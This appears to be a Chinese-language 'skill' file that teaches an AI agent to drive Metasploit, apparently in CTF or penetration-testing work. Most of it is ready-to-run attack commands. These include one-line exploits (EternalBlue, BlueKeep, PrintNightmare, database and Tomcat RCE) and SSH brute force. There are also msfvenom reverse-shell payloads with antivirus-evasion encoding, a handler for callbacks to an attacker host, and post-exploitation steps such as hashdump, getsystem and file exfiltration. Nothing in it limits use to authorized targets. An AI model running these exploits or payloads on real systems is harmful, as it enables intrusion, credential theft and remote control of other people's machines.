---
name: msf-oneshot
description: "Metasploit Framework 调用方法论（一行式 + 交互式）。当需要利用操作系统级漏洞（如 EternalBlue/MS17-010）、数据库远程漏洞（如 PostgreSQL/MySQL RCE）、网络服务漏洞（SMB/RDP/FTP）、需要生成 payload、启动反弹 shell handler、或后渗透操作时使用。MSF 拥有 2000+ exploit 模块，覆盖 Windows/Linux 操作系统、数据库、网络设备的远程利用。本技能同时覆盖一行式快速利用和 interactive_session 交互式操作（handler/meterpreter/后渗透）。任何涉及 metasploit、msfconsole、meterpreter、系统级 exploit、远程溢出、payload 生成、handler、后渗透的场景都应使用此技能"
metadata:
  tags: "metasploit,msf,msfconsole,meterpreter,exploit,eternalblue,ms17-010,payload,远程利用,操作系统漏洞,数据库漏洞,后渗透,msfvenom,handler,interactive_session"
  category: "tool"
---

# Metasploit Framework 调用方法论

MSF 有两种调用方式，分别适合不同场景：

| 方式 | 适用场景 | 工具 |
|------|---------|------|
| **一行式** (`msfconsole -q -x`) | 单次 exploit、漏洞检测、msfvenom | 直接 bash 执行 |
| **交互式** (`interactive_session`) | Handler 监听、Meterpreter 会话、后渗透 | `interactive_session` MCP 工具 |

一行式适合"发射后不管"的操作——执行完自动退出。但 handler 监听和 meterpreter 后渗透需要持续交互，一行式做不到（`-x` 执行完就退出了，`&` 后台化也无法读取输出）。这时用 `interactive_session` 启动一个持久 tmux 会话，就能随时发送命令、读取输出。

## 参考资料

常用 exploit 模块速查表和 payload 生成指南 → [references/msf-modules.md](references/msf-modules.md)

---

## Phase 1: 一行式基本语法

```bash
# 基本格式：用分号连接多条 MSF 命令
msfconsole -q -x "use EXPLOIT; set RHOSTS TARGET; set LHOST ATTACKER; run; exit"

# -q = 静默启动（不显示 banner）
# -x = 执行命令字符串
# exit = 执行完退出（重要！否则会挂起）
```

### 完整示例：EternalBlue (MS17-010)

```bash
msfconsole -q -x "
  use exploit/windows/smb/ms17_010_eternalblue;
  set RHOSTS 10.0.0.1;
  set LHOST 10.0.0.2;
  set PAYLOAD windows/x64/meterpreter/reverse_tcp;
  set LPORT 4444;
  run;
  exit
"
```

msfconsole 启动需要 10-30 秒加载模块库，这是正常现象。

## Phase 2: 常见漏洞利用场景

### 2.1 操作系统级漏洞（Zone 3/4 最常用）

```bash
# MS17-010 EternalBlue（Windows SMB）
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS TARGET; set LHOST ATTACKER; run; exit"

# MS08-067（Windows Server 2003/XP）
msfconsole -q -x "use exploit/windows/smb/ms08_067_netapi; set RHOSTS TARGET; set LHOST ATTACKER; run; exit"

# BlueKeep（Windows RDP CVE-2019-0708）
msfconsole -q -x "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS TARGET; set LHOST ATTACKER; set TARGET 2; run; exit"

# PrintNightmare（Windows Print Spooler）
msfconsole -q -x "use exploit/windows/dcerpc/cve_2021_1675_printnightmare; set RHOSTS TARGET; set LHOST ATTACKER; run; exit"
```

### 2.2 数据库远程利用

```bash
# PostgreSQL 代码执行（默认口令 postgres/postgres）
msfconsole -q -x "use exploit/multi/postgres/postgres_copy_from_program_cmd_exec; set RHOSTS TARGET; set USERNAME postgres; set PASSWORD postgres; set LHOST ATTACKER; run; exit"

# MySQL UDF 提权（需要已知凭据）
msfconsole -q -x "use exploit/multi/mysql/mysql_udf_payload; set RHOSTS TARGET; set USERNAME root; set PASSWORD ''; set LHOST ATTACKER; run; exit"

# MSSQL xp_cmdshell
msfconsole -q -x "use exploit/windows/mssql/mssql_payload; set RHOSTS TARGET; set USERNAME sa; set PASSWORD password; set LHOST ATTACKER; run; exit"

# Redis 未授权写 SSH key / Webshell
msfconsole -q -x "use exploit/linux/redis/redis_replication_cmd_exec; set RHOSTS TARGET; set LHOST ATTACKER; run; exit"
```

### 2.3 Web/中间件服务

```bash
# Tomcat Manager 部署 WAR（需要凭据）
msfconsole -q -x "use exploit/multi/http/tomcat_mgr_upload; set RHOSTS TARGET; set RPORT 8080; set HttpUsername tomcat; set HttpPassword tomcat; set LHOST ATTACKER; run; exit"

# JBoss 反序列化
msfconsole -q -x "use exploit/multi/http/jboss_invoke_deploy; set RHOSTS TARGET; set RPORT 8080; set LHOST ATTACKER; run; exit"

# Jenkins Script Console
msfconsole -q -x "use exploit/multi/http/jenkins_script_console; set RHOSTS TARGET; set RPORT 8080; set TARGETURI /; set LHOST ATTACKER; run; exit"
```

### 2.4 网络服务

```bash
# FTP vsftpd 2.3.4 后门
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS TARGET; run; exit"

# Samba（CVE-2017-7494）
msfconsole -q -x "use exploit/linux/samba/is_known_pipename; set RHOSTS TARGET; set LHOST ATTACKER; run; exit"

# SSH 暴力破解
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS TARGET; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; set STOP_ON_SUCCESS true; run; exit"
```

## Phase 3: 漏洞检测（不利用，只检测）

用 `auxiliary/scanner` 或 `check` 命令进行安全检测：

```bash
# 检测 MS17-010 是否存在（不利用）
msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS TARGET; run; exit"

# SMB 版本检测
msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set RHOSTS TARGET; run; exit"

# 批量端口服务检测
msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS TARGET; set PORTS 445,3389,1433,3306; run; exit"

# 使用 check 命令（部分 exploit 支持）
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS TARGET; check; exit"
```

## Phase 4: Payload 生成（msfvenom）

msfvenom 不需要 msfconsole，直接 bash 调用：

```bash
# Windows reverse shell EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o shell.exe

# Linux reverse shell ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f elf -o shell.elf

# PHP webshell
msfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f raw -o shell.php

# JSP webshell（Tomcat WAR 部署用）
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f war -o shell.war

# Python reverse shell
msfvenom -p python/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f raw -o shell.py

# 编码绕过（基础免杀）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o encoded.exe
```

## Phase 5: Handler 模式（interactive_session）

Handler 需要持续监听等待回连——一行式 `-x` 在执行完就退出了，无法维持监听。用 `interactive_session` 启动 msfconsole 交互会话来解决这个问题。

### 典型流程：生成 payload → 启动 handler → 投递 payload → 获取 session

**Step 1: 生成 payload**（一行式，Phase 4）

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o shell.exe
```

**Step 2: 启动 handler**（交互式）

```
interactive_session(action="start", session_name="msf_handler", command="msfconsole -q")
```

等待 15-20 秒让 msfconsole 加载完毕，然后配置 handler：

```
interactive_session(action="send", session_name="msf_handler", command="use exploit/multi/handler", wait=3)
interactive_session(action="send", session_name="msf_handler", command="set PAYLOAD windows/x64/meterpreter/reverse_tcp", wait=2)
interactive_session(action="send", session_name="msf_handler", command="set LHOST 0.0.0.0", wait=2)
interactive_session(action="send", session_name="msf_handler", command="set LPORT 4444", wait=2)
interactive_session(action="send", session_name="msf_handler", command="set ExitOnSession false", wait=2)
interactive_session(action="send", session_name="msf_handler", command="exploit -j", wait=5)
```

Handler 现在在后台监听。可以随时 `read` 检查是否有 session 回连：

```
interactive_session(action="read", session_name="msf_handler")
```

**Step 3: 投递 payload**

通过其他漏洞（文件上传、RCE 等）将 shell.exe 传到目标并执行。

**Step 4: 确认 session**

```
interactive_session(action="send", session_name="msf_handler", command="sessions -l", wait=3)
```

看到 `meterpreter` session 建立后，进入 Phase 6 后渗透。

### 快捷方式：一条 `-x` 启动 handler

如果你确定只需要监听不需要后续交互，也可以用一条命令启动：

```
interactive_session(action="start", session_name="msf_handler", command="msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; set ExitOnSession false; exploit'")
```

这样省去了逐条 `send` 的步骤，但后续交互仍然通过 `send`/`read` 进行。

## Phase 6: 后渗透操作（interactive_session）

获取 meterpreter session 后，通过 `interactive_session` 执行后渗透命令。meterpreter 是交互式 shell，只有在持久会话中才能充分使用。

### 进入 session 并收集信息

```
interactive_session(action="send", session_name="msf_handler", command="sessions -i 1", wait=3)
interactive_session(action="send", session_name="msf_handler", command="sysinfo", wait=3)
interactive_session(action="send", session_name="msf_handler", command="getuid", wait=3)
interactive_session(action="send", session_name="msf_handler", command="ipconfig", wait=3)
```

### 常用后渗透操作

```
# 文件系统操作
interactive_session(action="send", session_name="msf_handler", command="ls C:\\Users\\", wait=3)
interactive_session(action="send", session_name="msf_handler", command="download C:\\flag.txt /tmp/flag.txt", wait=5)
interactive_session(action="send", session_name="msf_handler", command="upload /tmp/tool.exe C:\\temp\\tool.exe", wait=5)

# 凭据提取（需要 SYSTEM 权限）
interactive_session(action="send", session_name="msf_handler", command="hashdump", wait=5)

# 提权
interactive_session(action="send", session_name="msf_handler", command="getsystem", wait=5)

# 网络信息（内网渗透前置）
interactive_session(action="send", session_name="msf_handler", command="arp", wait=3)
interactive_session(action="send", session_name="msf_handler", command="route", wait=3)

# 返回 MSF 主控台（保持 session 存活）
interactive_session(action="send", session_name="msf_handler", command="background", wait=3)
```

### 会话管理

```
# 列出所有 sessions
interactive_session(action="send", session_name="msf_handler", command="sessions -l", wait=3)

# 切换到另一个 session
interactive_session(action="send", session_name="msf_handler", command="sessions -i 2", wait=3)

# 结束操作后关闭 MSF
interactive_session(action="close", session_name="msf_handler")
```

### 备选方案：无需 meterpreter 的命令执行

如果不需要交互式 meterpreter（只想执行一条命令拿 flag），直接生成命令执行 payload 更简单：

```bash
msfvenom -p windows/x64/exec CMD="type C:\\flag.txt" -f exe -o cmd.exe
msfvenom -p linux/x64/exec CMD="cat /flag > /tmp/result.txt" -f elf -o cmd.elf
```

配合一行式 handler 即可（不需要 interactive_session）。

## 决策树：一行式 vs interactive_session

```
你要用 MSF 做什么？
│
├─ 执行单个 exploit（EternalBlue、Tomcat upload 等）
│   └→ 一行式 msfconsole -q -x "use ...; run; exit"
│
├─ 漏洞检测 / auxiliary scanner
│   └→ 一行式 msfconsole -q -x "use ...; run; exit"
│
├─ 生成 payload（msfvenom）
│   └→ 直接 bash 调用 msfvenom，不需要 msfconsole
│
├─ 启动 handler 等待反弹 shell
│   └→ interactive_session 启动 msfconsole，配置 handler
│      （handler 需要持续监听，一行式做不到）
│
├─ Meterpreter 后渗透（sysinfo、hashdump、文件操作）
│   └→ interactive_session send/read 交互
│      （meterpreter 是交互式 shell，需要持久会话）
│
├─ 只想执行一条命令拿 flag（不需要交互）
│   └→ msfvenom -p .../exec CMD="..." 生成命令执行 payload
│      配合一行式 handler 或 nc 监听即可
│
└─ Web 应用漏洞 (SQLi/XSS/SSRF)
    └→ 不用 MSF，curl/sqlmap/手动脚本更快
```

## 常见问题排查

| 症状 | 原因 | 解决 |
|------|------|------|
| Exploit completed, but no session | Payload 被杀/端口被占 | 换端口、换 payload、检查防火墙 |
| Connection refused | 目标端口未开放 | 先 nmap 确认端口开放 |
| msfconsole 启动超时 | 数据库连接慢 | 加 `--no-database` 或等待 |
| Payload 无法回连 | LHOST 错误/防火墙 | 确认 LHOST 是目标可达的 IP |
| interactive_session read 为空 | msfconsole 还在加载 | wait 设为 15-20 秒，重新 read |
